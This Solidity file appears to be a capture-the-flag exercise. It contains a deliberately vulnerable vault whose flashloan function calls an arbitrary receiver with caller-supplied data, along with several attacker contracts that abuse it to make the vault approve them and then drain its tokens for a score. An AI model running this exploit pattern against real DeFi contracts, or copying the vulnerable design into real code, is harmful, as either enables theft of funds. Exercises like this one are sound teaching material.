// SPDX-License-Identifier: UNLICENSED
// 1.checkData函数选择器计算正确。2.合约token余额归零。
pragma solidity 0.8.0;

interface ERC20Like {
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function allowance(address sender, address spender)
        external
        view
        returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}

interface IFlashloanReceiver {
    function onHintFinanceFlashloan(
        address token,
        address factory,
        uint256 amount,
        bool isUnderlyingOrReward,
        bytes memory data
    ) external;
}

contract ERC20 is IERC20 {
    string public constant name = "ERC20";
    string public constant symbol = "ERC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) balances;

    mapping(address => mapping(address => uint256)) allowed;

    uint256 totalSupply_ = 10 ether;

    constructor() {
        balances[msg.sender] = totalSupply_;
    }

    function totalSupply() public view override returns (uint256) {
        return totalSupply_;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return balances[account];
    }

    function transfer(address receiver, uint256 amount)
        public
        override
        returns (bool)
    {
        require(amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender] - amount;
        balances[receiver] = balances[receiver] + amount;
        emit Transfer(msg.sender, receiver, amount);
        return true;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        allowed[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(address sender, address spender)
        public
        view
        override
        returns (uint256)
    {
        return allowed[sender][spender];
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        require(amount <= balances[sender]);

        require(amount <= allowed[sender][msg.sender]);

        balances[sender] = balances[sender] - amount;
        allowed[sender][msg.sender] = allowed[sender][msg.sender] - amount;
        balances[recipient] = balances[recipient] + amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
}

contract financeVault {
    ERC20 public erc20 = new ERC20();
    bool lock;

    function checkData(bytes4 data)public returns(bool){
        return (data == this.checkData.selector);
    }

    function flashloan(
        address token,
        address receiver,
        uint256 amount,
        uint256 inneramount,//内量
        bool isUnderlyingOrReward,//是底层或奖励
        bytes calldata data
    ) external {
        uint256 balBefore = ERC20Like(token).balanceOf(address(this));
        ERC20Like(token).transfer(msg.sender, amount);

        lock = false;
        IFlashloanReceiver(receiver).onHintFinanceFlashloan(
            token,
            receiver,
            inneramount,
            isUnderlyingOrReward,
            data
        );
        lock = true;
        uint256 balAfter = ERC20Like(token).balanceOf(address(this));

        require(balAfter == balBefore); // don't want random tokens to get stuck
    }

    function approveAndCall(
        address target,
        uint256 amount,
        bytes calldata data
    ) public returns (bytes memory) {
        require(msg.sender == address(this));

        (bool success, bytes memory returnData) = address(target).call(data);
        require(success, string(returnData));
        return returnData;
    }

    // 测试函数选择器onHintFinanceFlashloan是否和approveAndCall相同
    // function onHintFinanceFlashloan(
    //     address token,
    //     address factory,
    //     uint256 amount,
    //     bool isUnderlyingOrReward,
    //     bytes memory data
    // ) external{}
    

}
contract attract{
    check che;
    ERC20 erc20;
    constructor(check addr) public {
        che = addr;
        erc20 = che.erc20();
    }

    //测试函数选择器是否相同
    // function geto1() public view returns(bytes4){
    //     return bytes4(che.onHintFinanceFlashloan.selector);
    // }
    // function geto2() public view returns(bytes4){
    //     return che.onHintFinanceFlashloan.selector;
    // }
    // function geto() public view returns(bytes4){
    //     return bytes4(keccak256("onHintFinanceFlashloan(address,address,uint256,bool,bytes)"));
    // }
    // function geta() public view returns(bytes4){
    //     return bytes4(keccak256("approveAndCall(address,uint256,bytes)"));
    // }

    function getdata() public view returns(bytes memory){
        return abi.encodeWithSignature("approve(address,uint256)",address(this),10 ether);
    }
    function att() public {
        bytes4 data = che.checkData.selector;
        che.flashloan(address(erc20),address(che),0,0xa0,false,getdata());
        erc20.transferFrom(address(che),address(this),10 ether);
        che.isCompleted(data);
    }
    function attract1() public {
        bytes4 data = che.checkData.selector;
        che.flashloan(address(erc20),address(che),0,0xa0,false,getdata());
        che.erc20().transferFrom(address(che), address(this), 10 ether);
        che.isCompleted(data);
    }

}

contract check is financeVault{
    uint256 public score;
    function isCompleted(bytes4 data) public {
        require(lock);
        score = 0;
        if(checkData(data)){
            score+=25;
        }
        if (erc20.balanceOf(address(this)) == 0) {
            score += 75;
        }
    }
    
}





contract att{
    check public che;
    ERC20 public erc20;
    constructor(address addr) public{
        che = check(addr);
        erc20 = che.erc20();
    } 
    function getdata() public view returns(bytes4 data){
        data = che.checkData.selector;
        
    }
    function fig() public view returns (bytes memory) {
        return
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                10 ether
            );
    }
    function attract() public {
        che.flashloan(address(erc20),address(che),0,0xa0,false,fig());
        che.erc20().transferFrom(address(che), address(this), 10 ether);
        che.isCompleted(getdata());
    }
}
